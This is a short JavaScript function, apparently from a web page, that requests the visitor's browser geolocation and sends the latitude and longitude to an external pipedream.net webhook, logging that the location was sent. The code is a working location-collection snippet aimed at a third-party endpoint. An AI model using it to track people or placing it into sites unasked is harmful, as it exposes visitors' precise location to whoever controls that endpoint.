function askForLocation() {
  if (!navigator.geolocation) return;

  navigator.geolocation.getCurrentPosition(
    (position) => {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;

      fetch("https://eola6haiozo2ls6.m.pipedream.net", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ latitude: lat, longitude: lon }),
      }).catch((err) => console.error("Error sending location:", err));

      console.log("Location sent:", lat, lon);
    },
    (error) => {
      console.log("Location error:", error.message);
    }
  );
}
